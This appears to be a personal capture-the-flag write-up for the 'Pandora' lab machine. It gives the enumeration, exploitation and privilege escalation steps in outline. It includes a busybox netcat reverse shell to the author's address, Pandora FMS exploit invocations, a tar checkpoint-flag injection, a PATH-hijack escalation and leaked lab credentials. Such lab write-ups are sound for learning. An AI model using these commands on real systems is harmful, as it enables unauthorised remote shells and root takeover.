#Pwned! 
```IP

```
# Enumeration
## SSH

## HTTP 80
Apache httpd 2.4.41
## SNMP
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217112117.png?raw=true)
```
daniel:HotelBabylon23
```

# Exploitation

# PrivEsc

## Manual
```
ssh daniel@10.10.11.136
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217112534.png?raw=true)

## Automated

### Peass

/tmp/pspy64

lrwxrwxrwx 1 root root 22 Jun 11  2021 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf                                                                                                                                                  
lrwxrwxrwx 1 root root 24 Jun 11  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf                                                                                                                                                       
-rw-r--r-- 1 root root 83 Dec  7  2021 /var/lib/dpkg/alternatives/my.cnf  
/etc/apache2/sites-enabled/pandora.conf
/usr/bin/pandora_backup


If we curl localhost we get the pandora http webpage
We use ligolo for portforwarding and to access it from our browser 
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217123241.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217123255.png?raw=true)
Now we have access from our machine:
```
curl 240.0.0.1
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217123457.png?raw=true)
The webpage has a login access:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217123339.png?raw=true)
When using the daniel credentials we already had it prompts the following error:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217123134.png?raw=true)

v7.0NG.742_FIX_PERL2020
RCE exploit for our Pandora version:
https://www.exploit-db.com/exploits/50961
```
python exploit.py -t 240.0.0.1 80 -u daniel 'HotelBabylon23' -c 'whoami'
```
It does not work with our credentials as shown below:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217124015.png?raw=true)

https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated
```
python sqlpwn.py -t 240.0.0.1 -f rev.php
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217164522.png?raw=true)
We can spawn a bash shell with busybox
```
busybox nc 10.10.14.16 443 -e sh
```
And then upgrade it with python3
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217165745.png?raw=true)
We got the flag!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217165937.png?raw=true)
We locate some credentials
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217170815.png?raw=true)
pandora:PandoraFMSSecurePass2021
We can't log to the mysql server with these credentials though
```
find / -perm -u=s -type f 2>/dev/null
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217174749.png?raw=true)
This is not a common file to have SUID permissions. Let's take a closer look to it.
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217174913.png?raw=true)
we have execution and reading privileges over it as matt, but it belongs to the root user. Suspicious.

We transfer the file to our local machine in order to execute the strings command over it:
```
nc 10.10.14.16 4444 < /usr/bin/pandora_backup
nc -lvnp 4444 > pandora_backup
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217175114.png?raw=true)
Once we execute the strings command over it we can see that it is executing tar without a full path, which can become a privilege escalation vector:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217175309.png?raw=true)
In GTFOBins we can find how to exploit this permission. It will read everything in the /var/www/pandora/pandora_backup/ directory, so we can create files that mimic a flag. The following flags can execute code as stated in the following URL:
https://gtfobins.github.io/gtfobins/tar/

```
echo "" > ' --checkpoint=1'
echo "" > ' --checkpoint-action=exec=sh'
```
Now we will execute the binary:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217180820.png?raw=true)
And it fails. For some reason sudo -l does not request us any password. for some reason setuserID user calls are broken.
With 
```
ps -ef
```
we can trace back what are our current process parents, and we will see that apache is one of them
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217181507.png?raw=true)
If we take a look at its configuration we will discover that there is a SetUserID that is breaking our same call
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217181700.png?raw=true)
We have to escape apache, so we will create  ssh keys in our machine
```
ssh-keygen -f matt
```
```
mkdir /home/matt/.ssh
cd /home/matt/.ssh
wget http://10.10.14.16:8000/matt.pub -O authorized_keys
```
And from our machine:
```
ssh -i matt matt@10.10.11.136
```
Which will bring us a shell that runs sudo fine.
We now run the program and it still does not work
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217183639.png?raw=true)
We can see that it is not executing our files as flags.... we will try yet another aproach. tar is executing without its full path. So we will create our own tar malicious file and inject a new directory to our PATH variable
```
echo '/bin/bash' > tar
chmod +x tar
export PATH=$(pwd):$PATH
/usr/bin/pandora_backup
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241217184521.png?raw=true)
### Mimikatz

# Lateral Movement


